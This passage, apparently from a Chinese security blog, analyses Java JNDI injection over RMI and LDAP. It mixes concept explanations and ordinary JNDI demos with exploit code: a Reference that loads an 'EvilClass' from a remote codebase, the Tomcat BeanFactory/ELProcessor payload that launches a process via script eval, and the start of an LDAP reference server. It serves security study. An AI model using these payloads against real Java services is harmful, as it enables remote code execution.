class="line">main:<span class="number">45</span>, TriggerJRMPCallByDeserialize (com.dem0.vuln)</span><br></pre></td></tr></table></figure><p>jdk8u241，在调用<code>UnicastRef.invoke</code>之前，做了一个检测。</p><h3 id="总结-EKI"><a href="#总结-EKI" class="headerlink" title="总结(EKI!!!)"></a>总结(EKI!!!)</h3><p><img src="https://img.dem0dem0.top/images/image-20220503220609196.png" alt="image-20220503220609196"></p><h2 id="0x02-JNDI"><a href="#0x02-JNDI" class="headerlink" title="0x02 JNDI"></a>0x02 JNDI</h2><blockquote><p>JNDI: JAVA名称和目录接口。<code>JNDI(Java Naming and Directory Interface)</code>是java提供的命名和目录服务，java可以通过他的API来命令和定位资源。可以访问的资源有:<code>DataSource(JDBC 数据源)</code>，<code>JNDI</code>可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code></p></blockquote><ul><li><p>Naming</p><p>名称，实际上就是通过名称查找实际对象的服务。举个例子</p><blockquote><ul><li>DNS: 通过域名查找ip地址</li><li>QQ: 通过QQ号找到你这个用户</li><li>…..</li></ul></blockquote><p>这里就不得不提另外一个服务叫<code>LDAP</code>,是一个轻量级的目录访问服务。详情可以参考:<a href="https://paper.seebug.org/1091/#ldap%E3%80%82%E6%88%91%E4%BB%AC%E7%BB%A7%E7%BB%AD%E4%BB%8B%E7%BB%8DNaming">https://paper.seebug.org/1091/#ldap。我们继续介绍Naming</a>.</p><p>在名称系统中，有几个重要的概念。</p><ul><li><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name（<code>HashMap(key=value)</code>)</li><li><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。(<code>二叉树的根节点或者子节点</code>)</li><li><strong>References</strong>: 在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以<code>引用(ref)</code>的形式进行存储，可以理解为 C&#x2F;C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li></ul></li><li><p>Directory</p><p>   目录服务是对于命名服务的一个拓展，除了<code>Naming</code>中已经有的(<code>name==&gt;value</code>)，之外，还给对象拥有了<code>attributes</code>,由此我们不仅可以通过name去搜索对象，还可以根据属性去搜索对象。</p><p>   以打印机服务为例，我们可以在命名服务中根据打印机名称去获取打印机对象(引用)，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等<strong>属性</strong>，作为目录服务，用户可以根据打印机的分辨率去搜索对应的打印机对象。</p><p>   常见服务:</p><ul><li>LDAP:上面已经说过。</li><li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li><li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li></ul><p>   总而言之，目录服务也是一种特殊的名称服务，关键区别是在目录服务中通常使用搜索(<code>search</code>)操作去定位对象，而不是简单的根据名称查找(<code>lookup</code>)去定位。</p></li><li><p>Interface</p><p>JAVA为了方便使用上述的目录服务，实现了<code>JNDI</code>。从理解上,JNDI本身不是某一类特定的目录服务，所以可以针对不同的服务提供统一操作接口。</p><p><code>JNDI</code>的架构主要是两层，应用层接口和SPI。</p><p><img src="https://img.dem0dem0.top/images/ac18342889f64a129ffa97152e54b3b8.png" alt="jndi"><br>JNDI 接口主要分为下述 5 个包:</p><ul><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a>（命名操作）</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a>(目录操作)</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a>(请求事件通知)</li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a>(允许动态插入不同实现，理解成为使JNDI能够访问自己定义的服务)</li></ul><h3 id="new-Quick-Start"><a href="#new-Quick-Start" class="headerlink" title=":new:Quick Start"></a>:new:Quick Start</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.Attributes;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.DirContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.directory.InitialDirContext;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSContextFactoryTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建环境变量对象</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        <span class="comment">//设置JNDI初始化工厂累名</span></span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line">        <span class="comment">//设置JNDI提供服务的URL地址</span></span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;dns://223.6.6.6/&quot;</span>);</span><br><span class="line">        <span class="comment">//创建JNDI目录服务对象</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DirContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line">            <span class="comment">//获取DNS解析记录测试</span></span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">attrs1</span> <span class="operator">=</span> context.getAttributes(<span class="string">&quot;baidu.com&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">attrs2</span> <span class="operator">=</span> context.getAttributes(<span class="string">&quot;dem0dem0.top&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line">            System.out.println(attrs1);</span><br><span class="line">            System.out.println(attrs2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细的解释已经在代码中标注，这里不再赘述。跟进代码看看。很明显重点的代码在<code>DirContext context = new InitialDirContext(env);</code>.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//跟进到最后javax.naming.spi.NamingManager.getInitialContext(Hashtable&lt;?,?&gt; env)</span></span><br><span class="line"><span class="type">InitialContextFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getInitialContextFactoryBuilder();</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> env != <span class="literal">null</span> ?(String)env.get(Context.INITIAL_CONTEXT_FACTORY) : <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//builder为null ==&gt; factory = (InitialContextFactory)helper.loadClass(className).newInstance();</span></span><br><span class="line">factory = builder.createInitialContextFactory(env);</span><br><span class="line"><span class="keyword">return</span> factory.getInitialContext(env);</span><br></pre></td></tr></table></figure><p>首先是<code>getInitialContextFactoryBuilder</code>去拿能够创建factory的<code>builder</code>。只有当这个builder没有被初始化的时候，才会去加载<code>Context.INITIAL_CONTEXT_FACTORY</code>,然后调用他的<code>getInitialContext</code>。</p><p>到这里让我们用JNDI来重写一下RMI。(这里也就能理解reg,server,client)</p><p>首先还是要新建Registery</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure><p>然后是server端来获取reg对象绑定对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            initialContext.bind(<span class="string">&quot;calc&quot;</span>,calc);</span><br><span class="line">            System.out.println(<span class="string">&quot;calc bindings&quot;</span>);</span><br><span class="line">            initialContext.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>然后是client获取reg对象拿实例对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">            <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) initialContext.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            initialContext.close();</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            li.add(<span class="number">1</span>);</span><br><span class="line">            li.add(<span class="number">2</span>);</span><br><span class="line">            System.out.println(calc.sum(li));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>所以我们不难看出，任何一个<code>JNDI Context</code>中都有下面几个方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">    将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">    枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">    检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">    将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">    取消绑定命名对象。</span><br></pre></td></tr></table></figure><p>对于<code>DirContext</code>来说，还支持<code>search/createSubcontext/getSchema/getSchemaClassDefinition</code>,这也符合我们之前所说的目录服务。</p><h3 id="key-JNDI动态协议转换"><a href="#key-JNDI动态协议转换" class="headerlink" title=":key:JNDI动态协议转换"></a>:key:JNDI动态协议转换</h3><p>具体原理不用分析，省流量: JNDI会根据提供的URL重新寻找<code>INITIAL_CONTEXT_FACTORY</code>.</p><h3 id="eyes-JNDI中的Reference"><a href="#eyes-JNDI中的Reference" class="headerlink" title=":eyes:JNDI中的Reference"></a>:eyes:JNDI中的Reference</h3><p>目录服务中存在的一种特殊的对象<code>Reference</code>引用。他的构造方法有以下几种：</p><p><img src="https://img.dem0dem0.top/images/image-20220531221602256.png" alt="image-20220531221602256"></p><p>这里面提到了<code>Reference</code>,那么绕不开的就还有<code>RefAddr</code>,这个就相当于是引用的一个指针。他有一个属性<code>addrType</code>表示地址类型。盲猜<code>URLClassLoader</code>,应该也用得上。</p><h3 id="bulb-JNDI-RMI"><a href="#bulb-JNDI-RMI" class="headerlink" title=":bulb:JNDI+RMI"></a>:bulb:JNDI+RMI</h3><p>rmi: 提供了<code>ReferenceWrapper</code>用来将JNDI的<code>Reference</code>包装成一个远程对象。现在想办法把这个引用，怎么变成一个对象？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">who</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;I am &quot;</span>+ name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;com.dem0.jndi.model.xUser&quot;</span>, <span class="string">&quot;com.dem0.jndi.model.UserFactory&quot;</span>, <span class="string">&quot;http://127.0.0.1:1600&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.rebind(<span class="string">&quot;User&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clent</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFactoryClent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line">        env.put(<span class="string">&quot;word&quot;</span>,<span class="string">&quot;Dem0&quot;</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        <span class="type">User</span> <span class="variable">obj</span> <span class="operator">=</span> (User) ctx.lookup(<span class="string">&quot;User&quot;</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        obj.who();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>debug一下流程，直接跳到<code>com.sun.jndi.rmi.registry.RegistryContext#lookup</code></p><p><img src="https://img.dem0dem0.top/images/image-20220531230257636.png" alt="image-20220531230257636"></p><p><img src="https://img.dem0dem0.top/images/image-20220531230409469.png" alt="image-20220531230409469"></p><p>拿到存根对象之后，进入decode</p><p><img src="https://img.dem0dem0.top/images/image-20220531230545741.png" alt="image-20220531230545741"></p><p>可以看到从这里开始，引用变实例了。通过<code>NamingManager.getObjectInstance</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220531230921678.png" alt="image-20220531230921678"></p><p><img src="https://img.dem0dem0.top/images/image-20220531231327818.png" alt="image-20220531231327818"></p><p>可以看到最后还是调用<code>Reference</code>里面的<code>ObjectFactory#getObjectInstance</code>。但是这里也给了我们一个思路<code>codebase</code>.</p><p><img src="https://img.dem0dem0.top/images/image-20220531231901475.png" alt="image-20220531231901475"></p><p>但是前提还是要先绕过<code>trustURLCodebase</code>.</p><p>这里的一个攻击思路就很明显了:<code>因为RegistryContext会解析ReferenceWrapper对象成Reference，如果Reference存在Factory的话还会进一步decode，从FactroyURL加载Factory并调用其getObjectInstance返回一个对象。本质上就是从远程加载类，直接开一个恶意类提供服务就行了。</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">eference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;whatever&quot;</span>,<span class="string">&quot;EvilClass&quot;</span>,<span class="string">&quot;http://localhost:16000/&quot;</span>);</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">registry.rebind(<span class="string">&quot;Foo&quot;</span>, wrapper);</span><br></pre></td></tr></table></figure><p>但是很显然高版本是默认关闭从远程加载的，但是本地的还是可以的。<code>org.apache.naming.factory.BeanFactory</code>+<code>EL</code>表达式还是可以的</p><blockquote><p>参考链接：<a href="https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java">https://github.com/apache/tomcat/blob/8e2aa5e45ce13388da62386e3cb1dbfa3b242b4b/java/org/apache/naming/factory/BeanFactory.java</a></p></blockquote><p>把代码简化一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> (Reference) obj;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载refrence classname对应的类为beanClass,并实例化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">beanClassName</span> <span class="operator">=</span> ref.getClassName();</span><br><span class="line">Class&lt;?&gt; beanClass = <span class="literal">null</span>;</span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">tcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span> (tcl != <span class="literal">null</span>) &#123;</span><br><span class="line">    beanClass = tcl.loadClass(beanClassName);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    beanClass = Class.forName(beanClassName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">BeanInfo</span> <span class="variable">bi</span> <span class="operator">=</span> Introspector.getBeanInfo(beanClass);</span><br><span class="line">PropertyDescriptor[] pda = bi.getPropertyDescriptors();</span><br><span class="line"><span class="type">Object</span> <span class="variable">bean</span> <span class="operator">=</span> beanClass.getConstructor().newInstance();</span><br><span class="line"><span class="comment">//然后找Reference的forceString属性</span></span><br><span class="line"><span class="type">RefAddr</span> <span class="variable">ra</span> <span class="operator">=</span> ref.get(<span class="string">&quot;forceString&quot;</span>);</span><br><span class="line">Map&lt;String, Method&gt; forced = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> (String)ra.getContent();</span><br><span class="line">Class&lt;?&gt; paramTypes[] = <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">1</span>];</span><br><span class="line">paramTypes[<span class="number">0</span>] = String.class;</span><br><span class="line">String setterName;</span><br><span class="line"><span class="type">int</span> index;</span><br><span class="line"><span class="comment">//将对应Reference的forceString属性值以逗号分隔为param</span></span><br><span class="line"><span class="keyword">for</span> (String param: value.split(<span class="string">&quot;,&quot;</span>)) &#123;</span><br><span class="line">    param = param.trim();</span><br><span class="line">    <span class="comment">//尝试将param分割成 x=y 的格式 或者xxx</span></span><br><span class="line">    index = param.indexOf(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    <span class="comment">//case 1: setterName = x param = y</span></span><br><span class="line">    <span class="keyword">if</span> (index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        setterName = param.substring(index + <span class="number">1</span>).trim();</span><br><span class="line">        param = param.substring(<span class="number">0</span>, index).trim();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//case 2:setterName = setXxxx （Java Bean规范）</span></span><br><span class="line">        setterName = <span class="string">&quot;set&quot;</span> +</span><br><span class="line">                     param.substring(<span class="number">0</span>, <span class="number">1</span>).toUpperCase(Locale.ENGLISH) +</span><br><span class="line">                     param.substring(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里将beanClass对应的以setterName为名的参数为String类型的方法放进forced Map中，并以param为键值</span></span><br><span class="line">    forced.put(param,beanClass.getMethod(setterName, paramTypes));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取Reference的所有RefAddr，并遍历</span></span><br><span class="line">Enumeration&lt;RefAddr&gt; e = ref.getAll();</span><br><span class="line"><span class="keyword">while</span> (e.hasMoreElements()) &#123;</span><br><span class="line">    ra = e.nextElement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> ra.getType();</span><br><span class="line">    value = (String)ra.getContent();</span><br><span class="line">    Object[] valueArray = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">//从forcemap里拿 propName（就是当前RefAddr的Type）对应的方法</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> forced.get(propName);</span><br><span class="line">    <span class="keyword">if</span> (method != <span class="literal">null</span>) &#123;</span><br><span class="line">        valueArray[<span class="number">0</span>] = value;</span><br><span class="line">        <span class="comment">//调用方法参数为value（就是当前RefAddr的Content）</span></span><br><span class="line">        method.invoke(bean, valueArray);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//遍历pda就是bean的属性描述</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i&lt;pda.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pda[i].getName().equals(propName)) &#123;</span><br><span class="line">            Class&lt;?&gt; propType = pda[i].getPropertyType();</span><br><span class="line">            <span class="comment">//只允许调用方法参数为几个基本类String/Double/Character/...且只能有一个参数的方法</span></span><br><span class="line">            <span class="keyword">if</span> (propType.equals(String.class)) &#123;</span><br><span class="line">                valueArray[<span class="number">0</span>] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Character.class)</span><br><span class="line">                       || propType.equals(<span class="type">char</span>.class)) &#123;</span><br><span class="line">                valueArray[<span class="number">0</span>] =</span><br><span class="line">                    Character.valueOf(value.charAt(<span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//拿到对应写属性的方法，调用其方法写属性</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">setProp</span> <span class="operator">=</span> pda[i].getWriteMethod();</span><br><span class="line">            setProp.invoke(bean, valueArray);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回写完属性生成的bean</span></span><br><span class="line"><span class="keyword">return</span> bean;</span><br></pre></td></tr></table></figure><p>大概总结一下流程，会新建<code>classname对应的类为beanClass</code>,然后根据<code>forceString</code>属性，的值来切分（“a&#x3D;b”）,就会调用B方法，并且将以a为主键的字符串传进去。最经典的exp也就不难解释了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,&#x27;calc.exe&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br></pre></td></tr></table></figure><p>浅蓝师傅： <a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a> 挖出了新的利用链。超爱eki的总结:</p><ul><li>恶意类有public修饰的无参构造方法（getConstructor().newInstance()所限）</li><li>恶意类有只有一个String.class类型参数的危险方法（paramTypes所限）</li><li>恶意类有只有一个基本类型参数的满足bean规范的（setXX）危险方法（paramTypes所限）</li></ul><h2 id="0x03-LDAP"><a href="#0x03-LDAP" class="headerlink" title="0x03 LDAP"></a>0x03 LDAP</h2><p>其实更多的就是对于RMI和上面这两种了，LDAP感觉我碰到挺少的。其实也就是常见的两种存储方式</p><ul><li><p>Reference</p><blockquote><p>高版本一样没有了</p></blockquote></li><li><p>序列化</p><blockquote><p>本地存在反序列化链子就可以。</p></blockquote></li></ul><p>LDAPserver:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.jndi.injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPReferenceServerTest</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置LDAP服务端口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SERVER_PORT</span> <span class="operator">=</span> <span class="number">3890</span>;</span><br><span class="line"><span class="comment">// 设置LDAP绑定的服务地址，外网测试换成0.0.0.0</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BIND_HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">// 设置一个实体名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span 